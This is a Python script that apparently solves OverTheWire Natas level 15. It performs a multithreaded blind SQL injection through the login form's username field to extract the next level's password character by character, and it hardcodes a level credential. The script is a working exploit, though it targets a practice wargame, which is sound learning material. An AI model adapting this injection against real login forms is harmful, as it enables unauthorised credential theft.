import requests
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor, as_completed

username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'

# Define the worker function
def check_char(char):
    Data = {"username": f"natas16\" and password COLLATE utf8mb4_bin LIKE \'%{char}%\'\""}
    try:
        response = requests.post(url, auth=HTTPBasicAuth(username, password), data=Data)
        if "exists" in response.text:
            return char, True
        else:
            return char, False
    except Exception as e:
        print(f"An error occurred: {e}")
        return char, False

def check_pass(passwd):
    Data = {"username": f"natas16\" and password COLLATE utf8mb4_bin LIKE \'{passwd}%\'\""}
    try:
        response = requests.post(url, auth=HTTPBasicAuth(username, password), data=Data)
        if "exists" in response.text:
            return True
        else:
            return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

# Create a thread pool and submit tasks
def main():
    chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    filtered = ""
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Submit all tasks
        futures = [executor.submit(check_char, char) for char in chars]
        
        # Collect results as they complete
        for future in as_completed(futures):
            char, exists = future.result()
            if exists:
                print(char)
                filtered += char
    print("start working on password")

    passwd = ""
    while len(passwd)!=32:
    # Submit all tasks
        for char in filtered:
            if check_pass(passwd+char):
                passwd += char
                break
        
        print(f"current passwd: {passwd} ")

if __name__ == "__main__":
    main()
